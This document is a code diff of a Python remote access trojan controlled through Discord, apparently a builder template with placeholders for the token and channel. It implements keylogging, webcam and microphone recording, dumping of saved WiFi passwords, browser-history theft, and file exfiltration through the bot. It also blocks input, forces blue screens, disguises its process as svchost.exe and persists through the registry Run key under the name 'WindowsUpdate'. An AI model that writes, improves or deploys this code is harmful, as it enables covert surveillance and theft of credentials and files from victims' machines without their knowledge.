@@ -14,6 +14,7 @@ import random
 import string
 import ctypes
 import threading
+import pyttsx3
 import platform
 import uuid
 import socket
@@ -23,24 +24,22 @@ import winreg
 import base64
 import atexit
 import win32clipboard
+import cv2
 import shutil
 import glob
 import json
 import sqlite3
+import win32crypt
+from PIL import ImageGrab
+import certifi
+import ssl
 import tempfile
 
-# SSL and certificate handling for bundled executables
 if getattr(sys, 'frozen', False):
-    try:
-        import certifi
-        os.environ['SSL_CERT_FILE'] = certifi.where()
-        os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
-        import ssl
-        ssl._create_default_https_context = ssl._create_unverified_context
-    except ImportError:
-        pass
+    os.environ['SSL_CERT_FILE'] = certifi.where()
+    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
+    ssl._create_default_https_context = ssl._create_unverified_context
 
-# Optional dependencies with graceful fallback
 try:
     from Crypto.Cipher import AES
     CRYPTO_AVAILABLE = True
@@ -57,79 +56,49 @@ except ImportError:
     pyaudio = None
     wave = None
 
-try:
-    from pynput import keyboard
-    PYNPUT_AVAILABLE = True
-except ImportError:
-    PYNPUT_AVAILABLE = False
-    keyboard = None
-
-try:
-    import cv2
-    CV2_AVAILABLE = True
-except ImportError:
-    CV2_AVAILABLE = False
-    cv2 = None
-
-# Windows only check
 if platform.system() != "Windows":
-    print("This script is designed for Windows only.")
     sys.exit(0)
 
-# Singleton lock to prevent multiple instances
-script_dir = os.path.dirname(os.path.abspath(__file__))
-lock_file = os.path.join(script_dir, ".lock")
-if os.path.exists(lock_file):
+dir = os.path.dirname(os.path.abspath(__file__))
+lock = os.path.join(dir, ".lock")
+if os.path.exists(lock):
     sys.exit(0)
-open(lock_file, "w").close()
+open(lock, "w").close()
 
-# Global state variables
 running = True
 keylog_active = False
-keylog_file = os.path.join(os.environ['TEMP'], "syslog.txt")
+keylog_file = os.environ['TEMP'] + "\\syslog.txt"
 critical_mode = False
 shake_active = False
-current_path = os.environ['SYSTEMDRIVE'] + "\\"
 
-# Cleanup function
 def cleanup():
     global running
     running = False
-    if os.path.exists(lock_file):
-        try:
-            os.remove(lock_file)
-        except:
-            pass
-
+    if os.path.exists(lock):
+        os.remove(lock)
 atexit.register(cleanup)
 
-# Lock file keeper thread
 def keep_lock_alive():
     while running:
-        if not os.path.exists(lock_file):
-            try:
-                open(lock_file, "w").close()
-            except:
-                pass
+        if not os.path.exists(lock):
+            open(lock, "w").close()
         time.sleep(0.1)
-
 threading.Thread(target=keep_lock_alive, daemon=True).start()
 
-# Configuration - These should be set externally
 class Config:
-    TOKEN = ""  # Set this externally
-    WHITELISTED = []  # Set this externally
-    MAIN_CHANNEL = 0  # Set this externally
-    PREFIX = "!"  # Set this externally
-    STARTUP = False  # Set this externally
+    TOKEN = "{placeholder_token}"
+    WHITELISTED = [{placeholder_whitelist}]
+    MAIN_CHANNEL = {placeholder_main_channel}
+    PREFIX = "{placeholder_prefix}"
+    STARTUP = {placeholder_add_to_startup}
 
-# Discord bot setup
 intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
 bot.remove_command("help")
 
-# Utility Functions
+current_path = os.environ['SYSTEMDRIVE'] + "\\"
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
@@ -138,9 +107,7 @@ def is_admin():
 
 def add_to_startup():
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                            r"Software\Microsoft\Windows\CurrentVersion\Run", 
-                            0, winreg.KEY_SET_VALUE)
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
         winreg.CloseKey(key)
         return True
@@ -192,12 +159,7 @@ def get_disks():
     for partition in psutil.disk_partitions():
         try:
             usage = psutil.disk_usage(partition.mountpoint)
-            disks.append({
-                'drive': partition.device, 
-                'free': f"{usage.free / (1024**3):.2f}", 
-                'total': f"{usage.total / (1024**3):.2f}", 
-                'percent': usage.percent
-            })
+            disks.append({'drive': partition.device, 'free': f"{usage.free / (1024**3):.2f}", 'total': f"{usage.total / (1024**3):.2f}", 'percent': usage.percent})
         except:
             pass
     return disks
@@ -217,13 +179,7 @@ def get_ipinfo():
         response = requests.get('http://ip-api.com/json/', timeout=5)
         if response.status_code == 200:
             data = response.json()
-            return {
-                'ip': data.get('query', 'N/A'), 
-                'country': data.get('country', 'N/A'), 
-                'region': data.get('regionName', 'N/A'), 
-                'city': data.get('city', 'N/A'), 
-                'isp': data.get('isp', 'N/A')
-            }
+            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A'), 'isp': data.get('isp', 'N/A')}
     except:
         pass
     return {'ip': get_local_ip(), 'country': 'N/A', 'region': 'N/A', 'city': 'N/A', 'isp': 'N/A'}
@@ -244,10 +200,7 @@ def get_wifipasswords():
             try:
                 info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True).decode('utf-8', errors='ignore')
                 password_match = re.search(r'Key Content\s*:\s*(.*)', info)
-                profiles.append({
-                    'name': name, 
-                    'password': password_match.group(1).strip() if password_match else "N/A"
-                })
+                profiles.append({'name': name, 'password': password_match.group(1).strip() if password_match else "N/A"})
             except:
                 profiles.append({'name': name, 'password': "N/A"})
     except:
@@ -264,8 +217,7 @@ def get_folder_path(folder_name):
         'desktop': "Desktop"
     }
     try:
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
-                            r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
         path = winreg.QueryValueEx(key, folder_map[folder_name])[0]
         winreg.CloseKey(key)
         if os.path.exists(path):
@@ -582,8 +534,6 @@ def get_idle_time():
     return f"{seconds//3600}h {(seconds%3600)//60}m {seconds%60}s"
 
 def capture_webcam(cam_id=0):
-    if not CV2_AVAILABLE:
-        return None
     cap = cv2.VideoCapture(cam_id)
     if not cap.isOpened():
         return None
@@ -599,64 +549,38 @@ def capture_webcam(cam_id=0):
 def record_mic(duration=10):
     if not AUDIO_AVAILABLE:
         return None
-    try:
-        CHUNK = 1024
-        FORMAT = pyaudio.paInt16
-        CHANNELS = 1
-        RATE = 44100
-        p = pyaudio.PyAudio()
-        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
-        frames = []
-        for _ in range(0, int(RATE / CHUNK * duration)):
-            try:
-                data = stream.read(CHUNK)
-                frames.append(data)
-            except:
-                break
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        path = os.environ['TEMP'] + "\\mic.wav"
-        wf = wave.open(path, 'wb')
-        wf.setnchannels(CHANNELS)
-        wf.setsampwidth(p.get_sample_size(FORMAT))
-        wf.setframerate(RATE)
-        wf.writeframes(b''.join(frames))
-        wf.close()
-        return path
-    except:
-        return None
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 44100
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    path = os.environ['TEMP'] + "\\mic.wav"
+    wf = wave.open(path, 'wb')
+    wf.setnchannels(CHANNELS)
+    wf.setsampwidth(p.get_sample_size(FORMAT))
+    wf.setframerate(RATE)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+    return path
 
 def speak(text):
-    try:
-        import pyttsx3
-        engine = pyttsx3.init()
-        engine.say(text)
-        engine.runAndWait()
-        return True
-    except:
-        return False
+    engine = pyttsx3.init()
+    engine.say(text)
+    engine.runAndWait()
 
 def show_message_box(text):
-    try:
-        ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)
-        return True
-    except:
-        return False
+    ctypes.windll.user32.MessageBoxW(0, text, "System Message", 0)
 
 def set_wallpaper(image_path):
-    try:
-        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
-        return True
-    except:
-        return False
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)
 
 def block_input(block):
-    try:
-        ctypes.windll.user32.BlockInput(block)
-        return True
-    except:
-        return False
+    ctypes.windll.user32.BlockInput(block)
 
 def make_critical():
     global critical_mode
@@ -670,73 +594,56 @@ def make_critical():
 def bluescreen():
     if not is_admin():
         return False
-    try:
-        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
-        ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
-        return True
-    except:
-        return False
+    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
+    ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
+    return True
 
 def hide_process():
     if is_admin():
-        try:
-            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
-            return True
-        except:
-            return False
+        ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
+        return True
     return False
 
 def start_keylog():
     global keylog_active
-    if not PYNPUT_AVAILABLE:
-        return False
     keylog_active = True
-    
+    from pynput import keyboard
     def on_press(key):
         if not keylog_active:
             return False
-        try:
-            with open(keylog_file, 'a', encoding='utf-8') as f:
-                try:
-                    if hasattr(key, 'char') and key.char:
-                        f.write(key.char)
-                    elif key == keyboard.Key.space:
-                        f.write(' ')
-                    elif key == keyboard.Key.enter:
-                        f.write('\n')
-                    else:
-                        f.write(f'[{str(key).replace("Key.", "").upper()}]')
-                except:
-                    pass
-        except:
-            pass
-    
+        with open(keylog_file, 'a', encoding='utf-8') as f:
+            try:
+                if hasattr(key, 'char') and key.char:
+                    f.write(key.char)
+                elif key == key.space:
+                    f.write(' ')
+                elif key == key.enter:
+                    f.write('\n')
+                else:
+                    f.write(f'[{str(key).replace("Key.", "").upper()}]')
+            except:
+                pass
     listener = keyboard.Listener(on_press=on_press)
     listener.start()
-    return True
+    listener.join()
 
 def start_shake(duration_seconds=10):
     global shake_active
     if shake_active:
         return False
     shake_active = True
-    
     def shake_loop():
         global shake_active
         start_time = time.time()
         while shake_active and (time.time() - start_time) < duration_seconds:
-            try:
-                x, y = pyautogui.position()
-                for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
-                    if not shake_active:
-                        break
-                    pyautogui.moveTo(x + dx, y + dy, duration=0.01)
-                    time.sleep(0.01)
-                time.sleep(0.02)
-            except:
-                break
+            x, y = pyautogui.position()
+            for dx, dy in [(0, 10), (10, 0), (0, -10), (-10, 0)]:
+                if not shake_active:
+                    break
+                pyautogui.moveTo(x + dx, y + dy, duration=0.01)
+                time.sleep(0.01)
+            time.sleep(0.02)
         shake_active = False
-    
     thread = threading.Thread(target=shake_loop, daemon=True)
     thread.start()
     return True
@@ -832,7 +739,6 @@ def get_file_emoji(filename):
     }
     return emoji_map.get(ext, '📄')
 
-# Discord Bot Commands
 def is_authorized():
     async def auth(ctx):
         if ctx.author.id in Config.WHITELISTED:
@@ -849,11 +755,7 @@ async def send_embed(ctx, title, description, color=discord.Color.blue()):
 @bot.event
 async def on_ready():
     await bot.get_channel(Config.MAIN_CHANNEL).send(f"<@{Config.WHITELISTED[0]}>")
-    embed = discord.Embed(
-        title="RAT Online", 
-        description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", 
-        color=discord.Color.green()
-    )
+    embed = discord.Embed(title="RAT Online", description=f"Prefix: `{Config.PREFIX}`\nUser: `{get_displayname()}`\nAdmin: {is_admin()}", color=discord.Color.green())
     await bot.get_channel(Config.MAIN_CHANNEL).send(embed=embed)
 
 @bot.command(name='info')
@@ -1007,10 +909,8 @@ async def virus_message(ctx):
 @is_authorized()
 async def voice_message(ctx, *, message: str):
     try:
-        if speak(message):
-            await send_embed(ctx, "Voice", f"Spoke: {message}", discord.Color.blue())
-        else:
-            await send_embed(ctx, "Voice Error", "Failed to speak message (pyttsx3 not installed)", discord.Color.red())
+        speak(message)
+        await send_embed(ctx, "Voice", f"Spoke: {message}", discord.Color.blue())
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
@@ -1142,6 +1042,7 @@ async def media_next(ctx):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== FIXED FILE LISTING ==========
 @bot.command(name='listfiles')
 @is_authorized()
 async def list_files(ctx, directory: str = "."):
@@ -1222,9 +1123,11 @@ async def list_files(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== IMAGES ONLY ==========
 @bot.command(name='images')
 @is_authorized()
 async def list_images(ctx, directory: str = "."):
+    """List only image files (jpg, png, gif, webp, bmp, ico, svg, tiff)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1266,9 +1169,11 @@ async def list_images(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== VIDS ONLY ==========
 @bot.command(name='vids')
 @is_authorized()
 async def list_videos_only(ctx, directory: str = "."):
+    """List only video files (mp4, avi, mkv, mov, wmv, flv, webm, m4v)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1308,9 +1213,11 @@ async def list_videos_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== AUDIO ONLY ==========
 @bot.command(name='audio')
 @is_authorized()
 async def list_audio_only(ctx, directory: str = "."):
+    """List only audio files (mp3, wav, flac, aac, ogg, wma, m4a, opus)"""
     try:
         if directory.startswith("~"):
             directory = os.path.expanduser(directory)
@@ -1350,6 +1257,7 @@ async def list_audio_only(ctx, directory: str = "."):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== SEARCH ==========
 @bot.command(name='search')
 @is_authorized()
 async def search_files(ctx, *, query: str):
@@ -1384,6 +1292,7 @@ async def search_files(ctx, *, query: str):
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
 
+# ========== RECENT ==========
 @bot.command(name='recent')
 @is_authorized()
 async def recent_files(ctx, count: int = 15):
@@ -1466,10 +1375,6 @@ async def mic_record(ctx, duration: int = 10):
 @bot.command(name='camrec')
 @is_authorized()
 async def cam_record(ctx, duration: int = 10):
-    if not CV2_AVAILABLE:
-        await send_embed(ctx, "❌ Error", "OpenCV not installed. Install with: pip install opencv-python", discord.Color.red())
-        return
-    
     if duration < 5:
         duration = 5
     if duration > 300:
@@ -1534,11 +1439,11 @@ async def geolocate(ctx):
         r = requests.get(f'http://ip-api.com/json/{ip}')
         data = r.json()
         embed = discord.Embed(title="Geolocation", color=discord.Color.green())
-        embed.add_field(name="IP", value=data.get('query', ip), inline=False)
-        embed.add_field(name="City", value=data.get('city', 'N/A'), inline=False)
-        embed.add_field(name="Country", value=data.get('country', 'N/A'), inline=False)
-        embed.add_field(name="ISP", value=data.get('isp', 'N/A'), inline=False)
-        embed.add_field(name="Map", value=f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}", inline=False)
+        embed.add_field(name="IP", value=data.get('query', ip))
+        embed.add_field(name="City", value=data.get('city', 'N/A'))
+        embed.add_field(name="Country", value=data.get('country', 'N/A'))
+        embed.add_field(name="ISP", value=data.get('isp', 'N/A'))
+        embed.add_field(name="Map", value=f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}")
         await ctx.send(embed=embed)
     except Exception as e:
         await send_embed(ctx, "Error", str(e), discord.Color.red())
@@ -1650,10 +1555,7 @@ async def killswitch(ctx):
         pass
     keylog_active = False
     if os.path.exists(keylog_file):
-        try:
-            os.remove(keylog_file)
-        except:
-            pass
+        os.remove(keylog_file)
     await send_embed(ctx, "Killswitch", "Traces cleaned, exiting", discord.Color.red())
     sys.exit(0)
 
@@ -1665,10 +1567,10 @@ async def keylog_cmd(ctx, action: str = None):
         if keylog_active:
             await send_embed(ctx, "Keylog", "Already running", discord.Color.orange())
             return
-        if start_keylog():
-            await send_embed(ctx, "Keylog", "Started", discord.Color.green())
-        else:
-            await send_embed(ctx, "Keylog", "Failed to start (pynput not installed)", discord.Color.red())
+        thread = threading.Thread(target=start_keylog, daemon=True)
+        thread.start()
+        keylog_active = True
+        await send_embed(ctx, "Keylog", "Started", discord.Color.green())
     elif action == 'stop':
         keylog_active = False
         await send_embed(ctx, "Keylog", "Stopped", discord.Color.orange())
@@ -1712,11 +1614,8 @@ async def keylog_dump(ctx):
 @is_authorized()
 async def keylog_clear(ctx):
     if os.path.exists(keylog_file):
-        try:
-            os.remove(keylog_file)
-            await send_embed(ctx, "⌨️ Keylog", "Logs cleared", discord.Color.green())
-        except:
-            await send_embed(ctx, "⌨️ Keylog", "Failed to clear logs", discord.Color.red())
+        os.remove(keylog_file)
+        await send_embed(ctx, "⌨️ Keylog", "Logs cleared", discord.Color.green())
     else:
         await send_embed(ctx, "⌨️ Keylog", "No logs to clear", discord.Color.orange())
 
@@ -1800,32 +1699,15 @@ async def browser_history(ctx):
     else:
         await send_embed(ctx, "History", "No browser history found", discord.Color.red())
 
+# ========== FOLDER COMMANDS ==========
 @bot.command(name='pictures')
 @is_authorized()
 async def pictures_cmd(ctx, *, path: str = ""):
-    base = get_folder_path('pictures')
     if path:
-        target = os.path.join(base, path)
-        if os.path.exists(target) and os.path.isdir(target):
-            await list_images(ctx, target)
-        else:
-            await send_embed(ctx, "Error", f"Folder not found: {target}", discord.Color.red())
+        target = os.path.join(get_folder_path('pictures'), path)
+        await list_files(ctx, target)
     else:
-        await list_images(ctx, base)
-
-@bot.command(name='pics')
-@is_authorized()
-async def pics_cmd(ctx):
-    await pictures_cmd(ctx)
-
-@bot.command(name='camroll')
-@is_authorized()
-async def camroll_cmd(ctx):
-    path = os.path.join(get_folder_path('pictures'), 'Camera Roll')
-    if os.path.exists(path) and os.path.isdir(path):
-        await list_images(ctx, path)
-    else:
-        await send_embed(ctx, "Error", "Camera Roll folder not found", discord.Color.red())
+        await list_files(ctx, get_folder_path('pictures'))
 
 @bot.command(name='downloads')
 @is_authorized()
@@ -1872,54 +1754,7 @@ async def desktop_cmd(ctx, *, path: str = ""):
     else:
         await list_files(ctx, get_folder_path('desktop'))
 
-@bot.command(name='download')
-@is_authorized()
-async def download_file(ctx, *, filepath: str):
-    try:
-        if not os.path.isabs(filepath) and not filepath.startswith('.'):
-            filepath = os.path.join(current_path, filepath)
-        elif filepath.startswith('.'):
-            filepath = os.path.join(current_path, filepath[2:])
-        filepath = os.path.normpath(filepath)
-        
-        if os.path.exists(filepath) and os.path.isfile(filepath):
-            size = os.path.getsize(filepath)
-            
-            if size > 104857600:  # 100MB
-                await send_embed(ctx, "Error", "File >100MB. Use external upload.", discord.Color.red())
-                return
-                
-            elif size > 25000000:  # 25MB Discord limit
-                await send_embed(ctx, "⚠️ Large File", f"Size: {size/1048576:.1f}MB. Splitting into chunks...", discord.Color.orange())
-                chunk_size = 20 * 1024 * 1024  # 20MB chunks
-                chunks = []
-                with open(filepath, 'rb') as f:
-                    chunk_num = 0
-                    while True:
-                        chunk = f.read(chunk_size)
-                        if not chunk:
-                            break
-                        chunk_num += 1
-                        chunk_path = f"{filepath}.part{chunk_num:03d}"
-                        with open(chunk_path, 'wb') as cf:
-                            cf.write(chunk)
-                        chunks.append(chunk_path)
-                
-                for i, chunk_path in enumerate(chunks):
-                    await ctx.send(file=discord.File(chunk_path))
-                    os.remove(chunk_path)
-                    if i < len(chunks) - 1:
-                        await asyncio.sleep(1)
-                
-                await send_embed(ctx, "✅ Done", f"File split into {len(chunks)} parts", discord.Color.green())
-                return
-            
-            await ctx.send(file=discord.File(filepath))
-        else:
-            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
-    except Exception as e:
-        await send_embed(ctx, "Error", str(e), discord.Color.red())
-
+# ========== SYSTEM FOLDER COMMANDS ==========
 @bot.command(name='programfiles')
 @is_authorized()
 async def program_files_cmd(ctx, *, path: str = ""):
@@ -2018,6 +1853,7 @@ async def goto_folder(ctx, *, path: str):
     else:
         await send_embed(ctx, "Error", f"Folder not found: {path}", discord.Color.red())
 
+# ========== ALIASES ==========
 @bot.command(name='sysinfo')
 @is_authorized()
 async def sysinfo_cmd(ctx):
@@ -2133,6 +1969,34 @@ async def upload_file(ctx):
     path = os.path.join(current_path, ctx.message.attachments[0].filename)
     await ctx.message.attachments[0].save(path)
     await send_embed(ctx, "Uploaded", path, discord.Color.green())
+
+@bot.command(name='download')
+@is_authorized()
+async def download_file(ctx, *, filepath: str):
+    try:
+        if not os.path.isabs(filepath) and not filepath.startswith('.'):
+            filepath = os.path.join(current_path, filepath)
+        elif filepath.startswith('.'):
+            filepath = os.path.join(current_path, filepath[2:])
+        filepath = os.path.normpath(filepath)
+        if os.path.exists(filepath) and os.path.isfile(filepath):
+            if os.path.getsize(filepath) > 104857600:
+                await send_embed(ctx, "Error", "File >100MB (Discord limit)", discord.Color.red())
+                return
+            await ctx.send(file=discord.File(filepath))
+        else:
+            dirname = os.path.dirname(filepath)
+            basename = os.path.basename(filepath)
+            if os.path.exists(dirname):
+                similar = [f for f in os.listdir(dirname) if basename.lower() in f.lower()]
+                if similar:
+                    await send_embed(ctx, "File Not Found", 
+                        f"Did you mean one of these?\n```\n" + "\n".join(similar[:5]) + "\n```\n\nUse: `!download filename`",
+                        discord.Color.orange())
+                    return
+            await send_embed(ctx, "Error", f"File not found: {filepath}", discord.Color.red())
+    except Exception as e:
+        await send_embed(ctx, "Error", str(e), discord.Color.red())
 
 @bot.command(name='exit')
 @is_authorized()
@@ -2257,8 +2121,8 @@ async def help_cmd(ctx):
     categories = {
         "🔧 Config": [
             f"**Prefix:** `{Config.PREFIX}`",
-            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>" if Config.WHITELISTED else "**Whitelisted:** None",
-            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>" if Config.MAIN_CHANNEL else "**Main Channel:** None"
+            f"**Whitelisted:** <@{Config.WHITELISTED[0]}>",
+            f"**Main Channel:** <#{Config.MAIN_CHANNEL}>"
         ],
         "ℹ️ System Info": [
             "`info` - Get advanced system information (HWID, CPU, GPU, RAM, IP, WiFi passwords)",
@@ -2321,13 +2185,11 @@ async def help_cmd(ctx):
             "`cd <path>` - Change directory",
             "`dir` - List current directory",
             "`listfiles <directory>` - List files with details",
-            "`download <file>` - Download a file (auto-splits large files)",
+            "`download <file>` - Download a file",
             "`upload` - Upload a file",
             "`downloads` - List Downloads folder",
             "`documents` - List Documents folder",
-            "`pictures` - Show only images in Pictures folder",
-            "`pics` - Alias for pictures",
-            "`camroll` - Show images from Camera Roll",
+            "`pictures` - List Pictures folder",
             "`music` - List Music folder",
             "`videos` - List Videos folder",
             "`desktop` - List Desktop folder",
@@ -2437,25 +2299,8 @@ async def delete_file(ctx, *, filepath: str):
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         await send_embed(ctx, "Unknown Command", f"Use `{Config.PREFIX}help`", discord.Color.red())
-    elif isinstance(error, commands.MissingRequiredArgument):
-        await send_embed(ctx, "Missing Argument", str(error), discord.Color.orange())
-    else:
-        await send_embed(ctx, "Error", str(error), discord.Color.red())
 
 if __name__ == "__main__":
     if Config.STARTUP:
         add_to_startup()
-    
-    # Check if token is set
-    if not Config.TOKEN:
-        print("Error: Bot token not configured. Please set Config.TOKEN")
-        sys.exit(1)
-    
-    try:
-        bot.run(Config.TOKEN)
-    except discord.LoginFailure:
-        print("Error: Invalid bot token")
-        sys.exit(1)
-    except Exception as e:
-        print(f"Error running bot: {e}")
-        sys.exit(1)
+    bot.run(Config.TOKEN)
